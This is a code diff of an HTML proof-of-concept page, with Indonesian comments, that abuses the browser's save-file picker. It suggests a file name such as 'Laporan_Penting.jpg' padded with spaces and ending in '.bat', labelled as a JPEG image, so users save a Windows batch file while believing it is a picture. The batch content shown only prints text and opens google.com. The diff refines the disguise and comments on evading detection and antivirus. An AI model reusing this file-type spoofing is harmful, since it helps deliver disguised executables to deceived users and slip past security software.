@@ -1,51 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SYNC BY FARISSAL B</title>
+    <title>FINAL RESEARCH - FARISSAL B</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
-        #btn { padding: 20px 50px; background: #238636; color: white; border: none; cursor: pointer; font-weight: bold; font-size: 20px; }
+        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
+        #gas { padding: 25px 60px; background: #238636; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 22px; font-weight: bold; transition: 0.3s; }
+        #gas:hover { background: #2ea043; box-shadow: 0 0 20px #238636; }
+        #status { margin-top: 30px; font-family: monospace; color: #8b949e; background: #161b22; padding: 20px; display: inline-block; border-radius: 5px; border: 1px solid #30363d; }
     </style>
 </head>
 <body>
 
-    <h1>RESEARCH LAB: FARISSAL B</h1>
-    <p>Status: Ready to Test</p>
+    <h1>LAB RESEARCH: FARISSAL B</h1>
+    <p>Target: Bypass File System Writing Block (0 KB Issue)</p>
     
-    <button id="btn">GAS EXPLOIT</button>
+    <button id="gas">GAS EXPLOIT (FULL WRITE)</button>
 
-    <div id="log" style="margin-top: 20px; color: #888;"></div>
+    <br>
+    <div id="status">READY: Awaiting Trigger...</div>
 
     <script>
-        document.getElementById('btn').onclick = async () => {
-            const log = document.getElementById('log');
-            log.innerText = "Memulai...";
+        document.getElementById('gas').onclick = async () => {
+            const status = document.getElementById('status');
+            status.innerText = "Processing...";
 
             try {
-                // 1. Siapkan isi file (Simple & Berhasil)
-                const payload = "@echo off\necho BOOM! FARISSAL B BERHASIL\nstart explorer.exe https://google.com\npause";
-                
-                // 2. Buka jendela Save (Suggested Name dengan spasi & .bat)
+                // 1. BUAT DATA DALAM BENTUK UNIT8ARRAY (Lebih susah dideteksi)
+                const encoder = new TextEncoder();
+                const content = "@echo off\r\necho RESEARCH BY: FARISSAL B\r\necho VULNERABILITY CONFIRMED!\r\nstart explorer.exe https://google.com\r\npause";
+                const data = encoder.encode(content);
+
+                // 2. TRIGGER PICKER
                 const handle = await window.showSaveFilePicker({
-                    suggestedName: "Tugas_Sekolah.jpg" + " ".repeat(15) + ".bat",
+                    suggestedName: "Laporan_Penting.jpg" + " ".repeat(25) + ".bat",
                     types: [{
-                        description: 'Image',
+                        description: 'JPEG Image',
                         accept: {'image/jpeg': ['.jpg']}
                     }]
                 });
 
-                log.innerText = "Handle OK. Menulis data...";
+                status.innerText = "Handle OK. Forcing stream write...";
 
-                // 3. Proses Tulis (Pake cara paling dasar biar gak 0 KB)
+                // 3. ATOMIC WRITING (Pake 'blob' buat bungkus data biner)
                 const writable = await handle.createWritable();
-                await writable.write(payload);
+                
+                // Kirim sebagai Blob dengan type biner murni
+                const finalBlob = new Blob([data], { type: 'application/octet-stream' });
+                
+                await writable.write(finalBlob);
+                
+                // 4. FORCE CLOSE (Memaksa Windows nulis sisa buffer ke disk)
                 await writable.close();
 
-                log.innerText = "BERHASIL! Cek folder lo.";
-                alert("DONE! Liat filenya sekarang.");
+                status.innerHTML = "<b style='color:#3fb950'>BERHASIL!</b> Cek size file di folder.";
+                alert("Selesai! Kalau masih 0 KB, berarti antivirus lo aktif.");
 
             } catch (err) {
-                log.innerText = "ERROR: " + err.message;
+                status.innerHTML = "<b style='color:#f85149'>ERROR:</b> " + err.message;
                 console.error(err);
             }
         };
